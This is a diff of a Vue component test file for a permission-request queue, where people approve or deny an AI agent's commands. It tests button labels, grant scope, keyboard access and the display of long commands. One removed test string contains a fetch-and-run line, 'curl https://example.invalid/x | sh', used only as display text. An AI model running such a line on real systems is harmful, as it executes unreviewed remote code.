@@ -1,3 +1,4 @@
+import ConversationPane from '../../src/renderer/src/components/ConversationPane.vue'
 import type {
   CardNobodyHolds,
   LedgerWalk,
@@ -16,8 +17,8 @@ import {
 } from '../../src/renderer/src/lib/attention'
 import { usePersonsQueue, type PersonsQueueRow } from '../../src/renderer/src/lib/persons-queue'
 import { decisionReading, readingSentence } from '../../src/shared/questions'
-import { assertDrawn, clipsOf, cutsOf, drawnReady, lineCount } from './drawn'
-import { mount, unmountAll, visible, type Mounted } from './harness'
+import { assertDrawn, clipsOf, cutsOf, drawnReady } from './drawn'
+import { mount, paneProps, record, unmountAll, visible, type Mounted } from './harness'
 
 /**
  * A request on *Waiting on you* is a compact card: who asked, the action it asks for in full, and
@@ -179,9 +180,16 @@ async function thePage(width = 1180, needsYou: AttentionRequest[] = []): Promise
 const label = (button: Element): string => button.querySelector('strong')?.textContent?.trim() ?? ''
 const follows = (a: Node, b: Node): boolean =>
   (a.compareDocumentPosition(b) & Node.DOCUMENT_POSITION_FOLLOWING) !== 0
-const primariesOf = (m: Mounted, key: string): HTMLElement[] => [
-  ...m.q(`persons-queue-actions-${key}`).querySelectorAll<HTMLElement>(':scope > .pq-answer'),
+const request = (m: Mounted, key: string) => m.q(`persons-queue-row-${key}`)
+const answersOf = (m: Mounted, key: string): HTMLElement[] => [
+  ...request(m, key).querySelectorAll<HTMLElement>('[data-permission-decision]'),
 ]
+const primariesOf = (m: Mounted, key: string): HTMLElement[] =>
+  answersOf(m, key).filter((button) =>
+    ['allow', 'deny'].includes(button.dataset.permissionDecision ?? ''),
+  )
+const detailOf = (m: Mounted, key: string): HTMLElement =>
+  request(m, key).querySelector<HTMLElement>('[data-cy="permission-detail"]')!
 
 beforeEach(() => {
   settled = []
@@ -193,12 +201,61 @@ afterEach(async () => {
   await page.viewport(ORIGINAL.width, ORIGINAL.height)
 })
 
+it('uses the conversation permission card for the same request in both queues', async () => {
+  const held = card('req_test', COMMAND, ALL_FOUR)
+  const pending = fromTheRecord('sess_brobot', held)
+  const pane = mount(ConversationPane, paneProps({ record: record([held.asked], 'sess_brobot') }))
+  supply([decision('sess_brobot', 'req_test', 240_000)], new Map([[pending.key, pending]]))
+  const queues = await thePage(1180, [pending])
+  const cards = [pane.q('permission-card'), ...queues.all('permission-card')]
+  expect(cards).toHaveLength(3)
+  for (const card of cards) {
+    expect(card.dataset.requestId).toBe('req_test')
+    expect(card.querySelector('[data-cy="permission-detail"]')?.textContent).toContain(COMMAND)
+  }
+  const routed = queues.q(`persons-queue-row-${pending.key}`)
+  routed.querySelector<HTMLButtonElement>('[data-cy="permission-deny"]')!.click()
+  expect(settled).toHaveLength(1)
+  expect(settled[0]!.decision).toMatchObject({ kind: 'permission', decision: { outcome: 'deny' } })
+})
+
+it('uses the conversation question card for the same provider question in both queues', async () => {
+  const held: CardNobodyHolds = {
+    ...card('q', '', []),
+    asked: {
+      type: 'user_input_request',
+      id: 'q',
+      prompt: 'Which draft?',
+      questions: [{ id: 'draft', prompt: 'Which draft?', options: [{ label: 'First' }] }],
+    },
+  }
+  const pending = fromTheRecord('sess_brobot', held)
+  const pane = mount(ConversationPane, paneProps({ record: record([held.asked], 'sess_brobot') }))
+  supply([decision('sess_brobot', 'q', 240_000)], new Map([[pending.key, pending]]))
+  const queues = await thePage(1180, [pending])
+  const cards = [pane.q('user-input-card'), ...queues.all('user-input-card')]
+  expect(cards).toHaveLength(3)
+  for (const card of cards) {
+    expect(card.dataset.requestId).toBe('q')
+    expect(card.hasAttribute('data-question-card')).toBe(true)
+    expect(card.textContent).toContain('Which draft?')
+  }
+  const routed = queues.q(`persons-queue-row-${pending.key}`)
+  routed.querySelector<HTMLButtonElement>('[data-cy="user-input-choice-draft"]')!.click()
+  expect(settled).toHaveLength(1)
+  expect(settled[0]!.decision).toMatchObject({
+    kind: 'answer',
+    questionId: 'draft',
+    option: 'First',
+  })
+})
+
 describe('§1 · who asked, what, and since when', () => {
   it('reads who, then what, then since when — and the page draws who and when on one top line', async () => {
     brobot()
     const m = await thePage()
     const who = m.q(`persons-queue-chain-${BROBOT}`)
-    const what = m.q(`persons-queue-request-${BROBOT}`)
+    const what = detailOf(m, BROBOT)
     const when = m.q(`persons-queue-since-${BROBOT}`)
     expect(who.textContent).toContain('BroBot')
     expect(what.textContent).toContain(COMMAND)
@@ -243,150 +300,121 @@ describe('§1 · who asked, what, and since when', () => {
 })
 
 describe('§2 · every choice the card supplies, in its own words', () => {
-  it('draws the request’s own answers side by side and every other one under more options', async () => {
+  it('draws each offered answer once, with the shared permission card’s wording', async () => {
     const row = brobot()
     const m = await thePage()
     const primaries = primariesOf(m, BROBOT)
-    expect(primaries.map(label)).toEqual(['Allow', 'Deny'])
+    expect(primaries.map(label)).toEqual(['Approve', 'Deny'])
     const [first, second] = primaries.map((one) => one.getBoundingClientRect())
-    expect(Math.abs(second!.top - first!.top)).toBeLessThanOrEqual(1)
-    expect(second!.left).toBeGreaterThanOrEqual(first!.right)
-
-    // Every supplied answer is drawn, once, in the card's words.
-    const every = m.all(`persons-queue-answer-${BROBOT}`)
-    expect(every.map(label).sort()).toEqual(row.decisions.map((one) => one.label).sort())
-    const broader = every.filter((one) => !primaries.includes(one))
-    expect(broader.map(label).sort()).toEqual(['Allow for this conversation', 'Cancel'])
-    const more = m.q(`persons-queue-more-${BROBOT}`)
-    for (const one of broader) expect(one.closest('details')).toBe(more)
-  })
-
-  it('keeps a card’s own word for its Allow, and never two buttons it did not supply', async () => {
-    const key = 'sess_glint:req_once'
-    const once = literal(key, {
-      decisions: [
-        { kind: 'permission', label: 'Allow once', decision: { outcome: 'allow' } },
-        { kind: 'permission', label: 'Deny', decision: { outcome: 'deny' } },
-      ],
-    })
-    supply([decision('sess_glint', 'req_once', 120_000)], new Map([[key, once]]))
-    const m = await thePage()
-    expect(primariesOf(m, key).map(label)).toEqual(['Allow once', 'Deny'])
-    expect(m.all(`persons-queue-answer-${key}`)).toHaveLength(2)
-    // Nothing broader is offered, so the disclosure says only that it holds details.
-    expect(m.q(`persons-queue-more-${key}`).querySelector('summary')?.textContent?.trim()).toBe(
-      'Details',
+    expect(second!.top).toBeGreaterThanOrEqual(first!.top)
+    expect(second!.bottom).toBeLessThanOrEqual(
+      m.q(`persons-queue-row-${BROBOT}`).getBoundingClientRect().bottom,
     )
+    const every = answersOf(m, BROBOT)
+    expect(every.map((one) => one.dataset.permissionDecision).sort()).toEqual(
+      row.decisions
+        .flatMap((one) => (one.kind === 'permission' ? [one.decision.outcome] : []))
+        .sort(),
+    )
+    expect(
+      every
+        .filter((one) => !primaries.includes(one))
+        .map(label)
+        .sort(),
+    ).toEqual(['Allow for this conversation', 'Cancel turn'])
   })
 
-  it('adds no Allow to a request that cannot be allowed, and says why above its answers', async () => {
-    const key = 'sess_orbit:req_no'
-    const cannot = literal(key, {
-      decisions: [
-        { kind: 'permission', label: 'Deny', decision: { outcome: 'deny' } },
-        { kind: 'permission', label: 'Cancel', decision: { outcome: 'cancel' } },
-      ],
-      noPositive: 'BroBot is offering no way to allow this — and refusing still works.',
-    })
-    supply([decision('sess_orbit', 'req_no', 40_000)], new Map([[key, cannot]]))
+  it('offers only the two decisions on a request with just approve and deny', async () => {
+    const once = fromTheRecord('sess_glint', card('req_once', COMMAND, ['allow', 'deny']))
+    supply([decision('sess_glint', 'req_once', 120_000)], new Map([[once.key, once]]))
     const m = await thePage()
-    expect(primariesOf(m, key).map(label)).toEqual(['Deny'])
-    const words = [...m.q(`persons-queue-row-${key}`).querySelectorAll('button')].map(label)
-    expect(words.filter((one) => one.startsWith('Allow'))).toEqual([])
-    const why = m.q(`persons-queue-cannot-allow-${key}`)
+    expect(answersOf(m, once.key).map(label)).toEqual(['Approve', 'Deny'])
+    expect(
+      m.q(`persons-queue-more-${once.key}`).querySelector('summary')?.textContent?.trim(),
+    ).toBe('Details')
+  })
+
+  it('draws the reason a request cannot be approved and offers only refusals', async () => {
+    const cannot = fromTheRecord('sess_orbit', card('req_no', COMMAND, ['deny', 'cancel']))
+    supply([decision('sess_orbit', 'req_no', 40_000)], new Map([[cannot.key, cannot]]))
+    const m = await thePage()
+    expect(answersOf(m, cannot.key).map(label)).toEqual(['Deny', 'Cancel turn'])
+    const why = m.q('permission-cannot-allow')
     expect(visible(why)).toBe(true)
-    expect(why.getBoundingClientRect().bottom).toBeLessThanOrEqual(
-      m.q(`persons-queue-actions-${key}`).getBoundingClientRect().top,
-    )
+    expect(why.textContent?.trim()).toBe(cannot.noPositive)
   })
 })
 
-describe('§3 · more options and details', () => {
-  it('opens from the keyboard, holding each broader choice with what it covers, before one is chosen', async () => {
+describe('§3 · scope, effects and details', () => {
+  it('opens the shared card’s extra details by keyboard', async () => {
     brobot()
     const m = await thePage()
-    const more = m.q(`persons-queue-more-${BROBOT}`) as HTMLDetailsElement
-    const summary = more.querySelector('summary')!
-    expect(summary.textContent?.trim()).toBe('More options and details')
-    const broader = [...more.querySelectorAll<HTMLElement>('button.pq-answer')]
-    const scope = m.q(`persons-queue-scope-${BROBOT}`)
-    expect(more.open).toBe(false)
-    for (const one of [...broader, scope]) expect(visible(one)).toBe(false)
-
+    const card = request(m, BROBOT)
+    const after = card.querySelector<HTMLElement>('[data-cy="permission-after"]')!
+    const details = after.closest('details')!
+    const summary = details.querySelector('summary')!
+    expect(details.open).toBe(false)
+    expect(visible(after)).toBe(false)
     summary.focus()
-    expect(document.activeElement).toBe(summary)
     await userEvent.keyboard('{Enter}')
     await nextTick()
-    expect(more.open).toBe(true)
-    for (const one of [...broader, scope]) expect(visible(one)).toBe(true)
-    // The full scope of the conversation grant, and the grant's own line inside its button.
-    expect(scope.innerText).toContain(
-      'for this conversation, its grant covers: commands starting with npm test (Bash(npm test:*))',
-    )
-    const grant = broader.find((one) => label(one) === 'Allow for this conversation')!
-    expect(grant.innerText).toContain('Bash(npm test:*)')
-    // The category, provenance and after-action lines are here too.
+    expect(details.open).toBe(true)
+    expect(visible(after)).toBe(true)
+    const more = m.q(`persons-queue-more-${BROBOT}`) as HTMLDetailsElement
+    more.open = true
+    await nextTick()
     expect(m.q(`persons-queue-says-${BROBOT}`).innerText).toContain('a person’s to give')
     expect(m.q(`persons-queue-work-${BROBOT}`).innerText.length).toBeGreaterThan(0)
-    expect(m.q(`persons-queue-after-${BROBOT}`).innerText.length).toBeGreaterThan(0)
-    // …and the next Tab reaches the first broader choice, nothing pressed yet.
-    await userEvent.tab()
-    expect(document.activeElement).toBe(broader[0])
     expect(settled).toEqual([])
   })
 
-  it('a primary answer is described by what it does, said in full in the disclosure', async () => {
+  it('keeps the exact grant separate from the command, and visible with the control that grants it', async () => {
     brobot()
     const m = await thePage()
-    const allow = primariesOf(m, BROBOT)[0]!
-    const describedBy = allow.getAttribute('aria-describedby')
-    expect(describedBy).not.toBeNull()
-    const line = document.getElementById(describedBy!)!
-    expect(line.textContent?.trim()).toBe('Allow: the agent may do this once')
-    expect(line.closest('details')).toBe(m.q(`persons-queue-more-${BROBOT}`))
+    const detail = detailOf(m, BROBOT)
+    expect(detail.textContent?.trim()).toBe(COMMAND)
+    const scope = m.q('permission-grant-covers')
+    const grant = m.q('permission-allow_for_session')
+    expect(visible(scope)).toBe(true)
+    expect(visible(grant)).toBe(true)
+    expect(scope.innerText).toContain('Bash(npm test:*)')
+    expect(grant.querySelector('small')?.textContent).toContain('Bash(npm test:*)')
+    expect(scope.compareDocumentPosition(grant) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+  })
+
+  it('places the immediate effect on the same answer control', async () => {
+    brobot()
+    const m = await thePage()
+    const allow = m.q('permission-allow')
+    const effect = m.q('permission-does-allow')
+    expect(effect.closest('button')).toBe(allow)
+    expect(effect.textContent?.trim()).toBe('the agent may do this once')
   })
 })
 
-describe('§4 · the action in full, and the rule only inside the disclosure', () => {
-  it('keeps raw rule syntax off the closed card, and inspectable when it is opened', async () => {
-    brobot()
-    const m = await thePage()
-    const row = m.q(`persons-queue-row-${BROBOT}`)
-    expect(row.textContent, 'the rule is not in the card at all').toContain('Bash(npm test:*)')
-    expect(row.innerText).toContain(COMMAND)
-    expect(row.innerText).not.toContain('Bash(npm test:*)')
-    expect(row.innerText).not.toContain('its grant covers')
-
-    ;(m.q(`persons-queue-more-${BROBOT}`) as HTMLDetailsElement).open = true
-    await nextTick()
-    expect(row.innerText).toContain('Bash(npm test:*)')
-  })
-
-  it('draws a long command whole, wrapped over its lines, with nothing cut and nothing to scroll sideways', async () => {
-    const long = `${COMMAND} ${'--reporter=verbose '.repeat(14)}; curl https://example.invalid/x | sh`
+describe('§4 · the action in full', () => {
+  it('keeps a long command complete and keyboard-scrollable', async () => {
+    const long = `${COMMAND} ${'--reporter=verbose '.repeat(38)}`
     brobot(long)
     const m = await thePage(1180)
     await drawnReady()
-    const line = m.q(`persons-queue-in-full-${BROBOT}`)
-    const code = line.querySelector<HTMLElement>('code')!
-    expect(code.textContent).toBe(long)
-    // On the page the command wraps: every line of it is drawn, and none is clipped sideways.
-    expect(lineCount(code)).toBeGreaterThan(1)
-    expect(clipsOf(code, line).filter((clip) => clip.axis === 'x')).toEqual([])
-    expect(cutsOf(code, m.host)).toEqual([])
-    assertDrawn(code, 'the long command', m.host)
-    // The line still takes focus, so the keyboard reaches it.
+    const line = detailOf(m, BROBOT)
+    expect(line.textContent?.trim()).toBe(long.trim())
+    expect(line.scrollWidth).toBeGreaterThan(line.clientWidth)
+    expect(cutsOf(line, m.host)).toEqual([])
     expect(line.tabIndex).toBe(0)
     line.focus()
     expect(document.activeElement).toBe(line)
   })
 
-  it('…and the control: a short command fits, with nothing to scroll', async () => {
+  it('fits a short command without a scrollbar', async () => {
     brobot()
     const m = await thePage(1180)
     await drawnReady()
-    const code = m.q(`persons-queue-in-full-${BROBOT}`).querySelector<HTMLElement>('code')!
-    expect(clipsOf(code, m.q(`persons-queue-in-full-${BROBOT}`))).toEqual([])
+    const line = detailOf(m, BROBOT)
+    expect(line.scrollWidth).toBeLessThanOrEqual(line.clientWidth)
+    expect(clipsOf(line, m.host)).toEqual([])
+    assertDrawn(line, 'the short command', m.host)
   })
 })
 
@@ -396,15 +424,13 @@ describe('§5 · a helper nobody opened is answered with its own choices', () =>
     const m = await thePage()
     expect(m.all(`persons-queue-take-over-${BROBOT}`)).toEqual([])
     expect(m.all(`persons-queue-no-answer-${BROBOT}`)).toEqual([])
-    expect(m.all(`persons-queue-answer-${BROBOT}`).map(label).sort()).toEqual(
-      row.decisions.map((one) => one.label).sort(),
-    )
+    expect(answersOf(m, BROBOT)).toHaveLength(row.decisions.length)
 
     primariesOf(m, BROBOT)[0]!.click()
     ;(m.q(`persons-queue-more-${BROBOT}`) as HTMLDetailsElement).open = true
     await nextTick()
-    m.all(`persons-queue-answer-${BROBOT}`)
-      .find((one) => label(one) === 'Cancel')!
+    answersOf(m, BROBOT)
+      .find((one) => one.dataset.permissionDecision === 'cancel')!
       .click()
     await nextTick()
     expect(settled.map((one) => [one.row.key, one.decision.label])).toEqual([
@@ -416,7 +442,7 @@ describe('§5 · a helper nobody opened is answered with its own choices', () =>
   it('…and the control: without the card it offers no answer, and the way to take it over', async () => {
     supply([decision('sess_brobot', 'req_test', 240_000)], new Map())
     const m = await thePage()
-    expect(m.all(`persons-queue-answer-${BROBOT}`)).toEqual([])
+    expect(answersOf(m, BROBOT)).toEqual([])
     expect(m.all(`persons-queue-take-over-${BROBOT}`)).toHaveLength(1)
   })
 })
@@ -488,14 +514,16 @@ describe('§7 · the corner’s copy still fits its 200px band', () => {
     const band = card.getBoundingClientRect()
     expect(Math.round(band.width)).toBe(200)
 
-    expect(getComputedStyle(m.q(`persons-queue-actions-${BROBOT}`)).flexDirection).toBe('column')
+    expect(
+      getComputedStyle(m.q('permission-allow').closest('.permission-actions')!).flexDirection,
+    ).toBe('column')
     const [allow, deny] = primariesOf(m, BROBOT).map((one) => one.getBoundingClientRect())
     expect(deny!.top, 'the corner drew its answers side by side').toBeGreaterThanOrEqual(
       allow!.bottom,
     )
     for (const el of [
       ...primariesOf(m, BROBOT),
-      m.q(`persons-queue-in-full-${BROBOT}`),
+      detailOf(m, BROBOT),
       m.q(`persons-queue-go-${BROBOT}`),
       m.q(`persons-queue-more-${BROBOT}`).querySelector<HTMLElement>('summary')!,
     ]) {
